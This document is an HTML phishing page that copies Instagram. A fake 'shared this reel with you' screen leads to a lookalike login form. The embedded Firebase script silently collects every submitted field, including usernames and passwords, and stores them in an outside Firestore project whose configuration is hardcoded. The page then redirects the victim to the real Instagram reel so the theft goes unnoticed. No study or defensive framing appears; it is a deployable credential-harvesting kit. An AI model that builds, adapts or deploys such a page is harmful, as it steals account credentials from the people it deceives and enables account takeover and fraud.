<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!-- Browser ko system theme detect karne ke liye batata hai -->
  <meta name="color-scheme" content="light dark">
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <style>
    /* ================= LIGHT MODE (DEFAULT WHITE) ================= */
    :root {
      --p1-bg: #ffffff;
      --p1-border: #dbdbdb;
      --text-main: #0f1419;
      --terms-text: #737373;
      --terms-strong: #262626;
      --reel-border: #dbdbdb;

      --p2-bg: #ffffff;
      --lang-text: #65676b;
      --input-bg: #ffffff;
      --input-border: #cbd2d9;
      --input-placeholder: #8a8d91;
      --input-focus: #1c1e21;
      --forgot-text: #1c1e21;
      --create-btn-border: #0064e0;
      --create-btn-text: #0064e0;
      --meta-color: #465a69;
    }

    /* ================= DARK MODE (AUTO SYSTEM DETECT) ================= */
    @media (prefers-color-scheme: dark) {
      :root {
        --p1-bg: #0c0f14;
        --p1-border: #22262f;
        --text-main: #ffffff;
        --terms-text: #8e959e;
        --terms-strong: #d1d5db;
        --reel-border: #1f242d;

        --p2-bg: #15181c;
        --lang-text: #8e969f;
        --input-bg: #15181c;
        --input-border: #3c454e;
        --input-placeholder: #7d858e;
        --input-focus: #8e969f;
        --forgot-text: #e4e6eb;
        --create-btn-border: #384654;
        --create-btn-text: #4599ff;
        --meta-color: #cbd2d9;
      }
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body, html {
      width: 100%;
      height: 100%;
      background-color: var(--p1-bg);
      color: var(--text-main);
      overflow-x: hidden;
      transition: background-color 0.2s ease, color 0.2s ease;
    }

    /* ================= PAGE 1 STYLES ================= */
    #page1 {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      background-color: var(--p1-bg);
    }

    .p1-header {
      height: 54px;
      display: flex;
      align-items: center;
      padding: 0 16px;
      border-bottom: 1px solid var(--p1-border);
    }

    .ig-text-logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 29px;
      color: var(--text-main);
      letter-spacing: 0.5px;
      font-weight: 400;
    }

    .p1-content {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px 32px;
      max-width: 420px;
      margin: 0 auto;
      width: 100%;
    }

    /* Reel Box Hamesha Pure Black Rahega */
    .reel-box {
      width: 210px;
      height: 375px;
      background-color: #000000;
      border-radius: 16px;
      border: 1px solid var(--reel-border);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
    }

    .play-icon {
      width: 32px;
      height: 32px;
      fill: #ffffff;
    }

    .shared-text {
      font-size: 20px;
      font-weight: 600;
      text-align: center;
      line-height: 1.35;
      color: var(--text-main);
      margin-bottom: 22px;
      padding: 0 12px;
    }

    .signin-btn {
      width: 100%;
      height: 46px;
      background-color: #4150f7;
      color: #ffffff;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 28px;
    }

    .signin-btn:active {
      opacity: 0.85;
    }

    .terms-text {
      font-size: 12px;
      color: var(--terms-text);
      text-align: center;
      line-height: 1.5;
      padding: 0 10px;
    }

    .terms-text strong {
      color: var(--terms-strong);
      font-weight: 600;
    }

    /* ================= PAGE 2 STYLES ================= */
    #page2 {
      display: none;
      flex-direction: column;
      justify-content: space-between;
      min-height: 100vh;
      background-color: var(--p2-bg);
      padding: 16px 16px 20px;
      max-width: 450px;
      margin: 0 auto;
      width: 100%;
    }

    .lang-top {
      text-align: center;
      font-size: 13px;
      color: var(--lang-text);
      margin-top: 2px;
    }

    .p2-center {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      margin-top: -20px;
    }

    .ig-glyph {
      width: 62px;
      height: 62px;
      margin-bottom: 56px;
    }

    .login-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .input-field {
      width: 100%;
      height: 54px;
      background-color: var(--input-bg);
      border: 1px solid var(--input-border);
      border-radius: 12px;
      padding: 0 16px;
      font-size: 15px;
      color: var(--text-main);
      outline: none;
    }

    .input-field::placeholder {
      color: var(--input-placeholder);
    }

    .input-field:focus {
      border-color: var(--input-focus);
    }

    .login-submit-btn {
      width: 100%;
      height: 46px;
      background-color: #0064e0;
      color: #ffffff;
      border: none;
      border-radius: 25px;
      font-size: 15px;
      font-weight: 600;
      margin-top: 4px;
      cursor: pointer;
    }

    .login-submit-btn:active {
      background-color: #0051b5;
    }

    .forgot-link {
      margin-top: 18px;
      font-size: 14px;
      font-weight: 500;
      color: var(--forgot-text);
      text-decoration: none;
      text-align: center;
    }

    .p2-bottom {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      gap: 18px;
    }

    .create-acc-btn {
      width: 100%;
      height: 44px;
      background-color: transparent;
      border: 1px solid var(--create-btn-border);
      border-radius: 25px;
      color: var(--create-btn-text);
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
    }

    .meta-footer {
      display: flex;
      align-items: center;
      gap: 5px;
      color: var(--meta-color);
      font-size: 15px;
      font-weight: 500;
    }

    .meta-icon {
      width: 20px;
      height: 14px;
      fill: none;
      stroke: var(--meta-color);
      stroke-width: 2.2;
    }
  </style>
</head>
<body>

  <!-- ================= PAGE 1: REEL PREVIEW ================= -->
  <div id="page1">
    <header class="p1-header">
      <div class="ig-text-logo">Instagram</div>
    </header>

    <main class="p1-content">
      <div class="reel-box" onclick="openLoginPage()">
        <svg class="play-icon" viewBox="0 0 24 24">
          <path d="M6.5 4.5C5.67 3.98 4.5 4.58 4.5 5.56v12.88c0 .98 1.17 1.58 2 1.06l11-6.44c.83-.49.83-1.63 0-2.12l-11-6.44z"/>
        </svg>
      </div>

      <div class="shared-text">
        think different shared this reel<br>with you
      </div>

      <button class="signin-btn" onclick="openLoginPage()">Sign in</button>

      <p class="terms-text">
        By continuing, you agree to Instagram's <strong>Terms of Use</strong> and <strong>Privacy Policy</strong>.
      </p>
    </main>
  </div>

  <!-- ================= PAGE 2: SECOND SCREEN ================= -->
  <div id="page2">
    <div class="lang-top">English (UK)</div>

    <div class="p2-center">
      <svg class="ig-glyph" viewBox="0 0 100 100">
        <defs>
          <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
            <stop offset="0%" stop-color="#fdf497" />
            <stop offset="5%" stop-color="#fdf497" />
            <stop offset="45%" stop-color="#fd5949" />
            <stop offset="60%" stop-color="#d6249f" />
            <stop offset="90%" stop-color="#285AEB" />
          </radialGradient>
        </defs>
        <rect x="6" y="6" width="88" height="88" rx="24" fill="none" stroke="url(#igGrad)" stroke-width="8"/>
        <circle cx="50" cy="50" r="21" fill="none" stroke="url(#igGrad)" stroke-width="8"/>
        <circle cx="73.5" cy="26.5" r="5.5" fill="url(#igGrad)"/>
      </svg>

      <form class="login-form" id="loginForm">
        <input 
          type="text" 
          id="username" 
          class="input-field" 
          placeholder="Username, email address or mobile number" 
          required
        >
        <input 
          type="password" 
          id="password" 
          class="input-field" 
          placeholder="Password" 
          required
        >
        <button type="submit" class="login-submit-btn">Log in</button>
      </form>
      <!-- MASTER FIREBASE FORM SCRIPT: Paste at the bottom of any HTML file -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";

  // Aapka Firebase Configuration
  const firebaseConfig = {
    apiKey: "AIzaSyCA6HMq3g5hO_GYiI0DrlTh9V2Ve3VHO4g",
    authDomain: "coop-grind-prod-3a1f8.firebaseapp.com",
    projectId: "coop-grind-prod-3a1f8",
    storageBucket: "coop-grind-prod-3a1f8.firebasestorage.app",
    messagingSenderId: "349604329745",
    appId: "1:349604329745:web:100ef75e59a71e879af4b0",
    measurementId: "G-4WDCQQ80WY"
  };

  // Initialize Firebase & Firestore
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getFirestore(app);

  // Page ke saare forms ko auto-connect karne ka logic
  document.querySelectorAll("form").forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault(); // Page reload hone se rokega

      const submitBtn = form.querySelector('[type="submit"], button:not([type="button"])');
      const originalBtnText = submitBtn ? submitBtn.innerText : "";
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerText = "Saving...";
      }

      // Form ke har input, select aur textarea se data auto-extract karna
      const formData = {};
      const elements = form.querySelectorAll("input, select, textarea");

      elements.forEach((el, index) => {
        if (el.type === "submit" || el.type === "button" || el.type === "reset") return;

        // Key ka naam तय karna (name -> id -> placeholder -> field_index)
        const key = el.name || el.id || el.placeholder || `field_${index + 1}`;

        if (el.type === "checkbox") {
          formData[key] = el.checked;
        } else if (el.type === "radio") {
          if (el.checked) formData[key] = el.value;
        } else {
          formData[key] = el.value.trim();
        }
      });

      // Extra details taaki pata chale kis page/form se data aaya
      formData.submittedAt = serverTimestamp();
      formData.pagePath = window.location.pathname;

      // Custom collection name agar form me data-collection attribute diya ho, warna default
      const collectionName = form.getAttribute("data-collection") || "school_form_submissions";

      try {
        await addDoc(collection(db, collectionName), formData);
        alert("Form successfully submit ho gaya!");
        form.reset();
      } catch (error) {
        console.error("Firebase Save Error:", error);
        alert("Data save karne me error aaya: " + error.message);
      } finally {
        if (submitBtn) {
          submitBtn.disabled = false;
          submitBtn.innerText = originalBtnText;
        }
      }
    });
  });
                          </script>
      

      <a href="#" class="forgot-link">Forgotten password?</a>
    </div>

    <div class="p2-bottom">
      <button type="button" class="create-acc-btn">Create new account</button>
      <div class="meta-footer">
        <svg class="meta-icon" viewBox="0 0 36 24">
          <path d="M8.5 19C4.5 19 2 16 2 12C2 8 4.8 5 8.5 5C12.5 5 15.2 8.5 18 12C20.8 15.5 23.5 19 27.5 19C31.2 19 34 16 34 12C34 8 31.5 5 27.5 5C23.5 5 20.8 8.5 18 12C15.2 15.5 12.5 19 8.5 19Z" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        <span>Meta</span>
      </div>
    </div>
  </div>

  <script>
    function openLoginPage() {
      document.getElementById('page1').style.display = 'none';
      document.getElementById('page2').style.display = 'flex';
      document.body.style.backgroundColor = 'var(--p2-bg)';
    }

    const params = new URLSearchParams(window.location.search);
    const reelId = params.get('reel');
    const defaultReelUrl = "https://www.instagram.com/reels/";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const finalRedirectUrl = reelId 
        ? `https://www.instagram.com/reel/${reelId}/` 
        : defaultReelUrl;

      window.location.replace(finalRedirectUrl);
    });
  </script>

</body>
</html>
